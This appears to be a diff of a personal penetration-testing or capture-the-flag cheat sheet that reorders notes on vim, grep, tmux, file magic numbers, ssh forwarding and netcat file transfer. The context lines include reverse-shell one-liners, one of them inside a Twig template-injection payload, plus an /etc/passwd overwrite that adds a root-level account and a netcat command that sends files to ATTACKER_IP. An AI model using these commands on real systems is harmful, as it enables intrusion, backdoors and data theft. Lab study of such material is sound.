@@ -22,6 +22,93 @@ sh -i >& /dev/tcp/10.10.14.74/4444 0>&1
 {{ this.controller.getTwig().getFilter("bash -c 'bash -i >& /dev/tcp/10.127.255.241/4455 0>&1'") }}
 ```
 
+# vim
+```vim
+Shift+H     # Move cursor to the top of the screen.
+Shift+M     # Move cursor to the middle of the screen.
+Shift+L     # Move cursor to the bottom of the screen.
+gj          # Move one line down if text is within one line.
+g0          # Move cursor to the start of the current line.
+dk          # Delete current line and the line above it.
+gq q        # Format selected text into a single block of multiple lines (VAPGQ).
+J           # Join lines together (opposite of GQ).
+gj          # Join lines without spaces (opposite of J).
+gu u        # Convert to lowercase.
+gU U        # Convert to uppercase.
+~           # Toggle case of current character.
+g~ ~        # Toggle case of all characters in the current line.
+gf          # Open the file whose name is under the cursor, '^' to go back.
+gv          # Return to the previous selection after visual mode.
+```
+---
+# grep
+```sh
+locate seclist | grep <what>
+grep -Rwi "text"             # Recursively search for lines
+grep -n                      # show numbers of lines
+grep -i                      # do not care abuot regex
+grep -c                      # how many times
+grep linux * -r              # recursive  in all files
+# точка - это любой символ, -f чтоб точка не считалась любым символом
+-v '^#'                      # begins with
+'^$'                         # пустые строки
+-e '^(#|$)'                  # начинается или с # или с $(пустая строка)
+grep -e 'colou?r'            # ? makes preveous character optional (то есть и может стоять и нет)
+grep -w 'root'               # only word root, not asdrootas
+\grep                        # unalias
+-A5                          # five line after the math
+-B5                          # before
+-C5                          # before and after
+-e '[0-9]{5,6}/tcp' file.txt # от 5 до 6 цифр от 0 до 9
+-E '[0-9]$'                  # number at the end of line
+-E '\s*'                     # space or tab 
++                            # one and more chars
+```
+
+---
+# tmux
+```
+ctrl b d # сохранить сессию и выйти из нее
+cb p     # previous window
+cb n     # next window
+cb ,     # rename window
+cb c     # create window
+cb w     # list windows
+tmux new -s [name_of_new_window]
+cb :set -g mouse on
+```
+---
+# File Transfer on `Netcat`
+
+1. To download a file on the remote shell:
+
+```nc
+nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
+```
+
+2. To receive the file on the attacker machine:
+
+```nc
+nc -l ATTACKER_PORT > [output_file_path]
+```
+
+---
+# magic numbers
+png
+```
+89504E470D0A1A0A
+```
+gif
+```
+GIF87a    474946383761
+GIF89a    474946383961
+```
+
+---
+# ssh port forwarding
+```sh
+ssh -L <my_port>:127.0.0.1:<port_of_remote_host> admin@1.1.1.1
+```
 # scan rpc port
 ```
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
@@ -126,21 +213,7 @@ mount -t nfs $IP:/mnt/backups /mnt/loot
 echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
 ```
 ---
-# File Transfer on `Netcat`
 
-1. To download a file on the remote shell:
-
-```nc
-nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
-```
-
-2. To receive the file on the attacker machine:
-
-```nc
-nc -l ATTACKER_PORT > [output_file_path]
-```
-
----
 # Transfer files using `scp`:
 
 ```
@@ -160,33 +233,7 @@ showmount -e $IP
 sudo mkdir /mnt/nfs                                                              sudo mount -t nfs $IP:/var/failsafe /mnt/nfs 
 ```
 ---
-
-# grep
-```sh
-locate seclist | grep <what>
-grep -Rwi "text"             # Recursively search for lines
-grep -n                      # show numbers of lines
-grep -i                      # do not care abuot regex
-grep -c                      # how many times
-grep linux * -r              # recursive  in all files
-# точка - это любой символ, -f чтоб точка не считалась любым символом
--v '^#'                      # begins with
-'^$'                         # пустые строки
--e '^(#|$)'                  # начинается или с # или с $(пустая строка)
-grep -e 'colou?r'            # ? makes preveous character optional (то есть и может стоять и нет)
-grep -w 'root'               # only word root, not asdrootas
-\grep                        # unalias
--A5                          # five line after the math
--B5                          # before
--C5                          # before and after
--e '[0-9]{5,6}/tcp' file.txt # от 5 до 6 цифр от 0 до 9
--E '[0-9]$'                  # number at the end of line
--E '\s*'                     # space or tab 
-+                            # one and more chars
-```
-
----
-# ssh
+# make id rsa ssh
 ```
 ssh-keygen -t rsa -q -f "$HOME/.ssh/id_rsa" -N ""
 ```
@@ -198,49 +245,6 @@ ftp -A $IP #connect anon
 prompt off
 mget * #download all files
 ```
----
-# vim
-```vim
-Shift+H     # Move cursor to the top of the screen.
-Shift+M     # Move cursor to the middle of the screen.
-Shift+L     # Move cursor to the bottom of the screen.
-gj          # Move one line down if text is within one line.
-g0          # Move cursor to the start of the current line.
-dk          # Delete current line and the line above it.
-gq q        # Format selected text into a single block of multiple lines (VAPGQ).
-J           # Join lines together (opposite of GQ).
-gj          # Join lines without spaces (opposite of J).
-gu u        # Convert to lowercase.
-gU U        # Convert to uppercase.
-~           # Toggle case of current character.
-g~ ~        # Toggle case of all characters in the current line.
-gf          # Open the file whose name is under the cursor, '^' to go back.
-gv          # Return to the previous selection after visual mode.
-```
----
-# tmux
-```
-ctrl b d # сохранить сессию и выйти из нее
-cb p     # previous window
-cb n     # next window
-cb ,     # rename window
-cb c     # create window
-cb w     # list windows
-tmux new -s [name_of_new_window]
-cb :set -g mouse on
-```
----
-# magic numbers
-png
-```
-89504E470D0A1A0A
-```
-gif
-```
-GIF87a    474946383761
-GIF89a    474946383961
-```
-
 ---
 # mv multiple files
 ```
@@ -255,10 +259,7 @@ sudo -u user bash
 ```
 ---
 
-# ssh port forwarding
-```sh
-ssh -L <my_port>:127.0.0.1:<port_of_remote_host> admin@1.1.1.1
-```
+
 # shells
 ```
 SHELL=/bin/bash script -q /dev/null
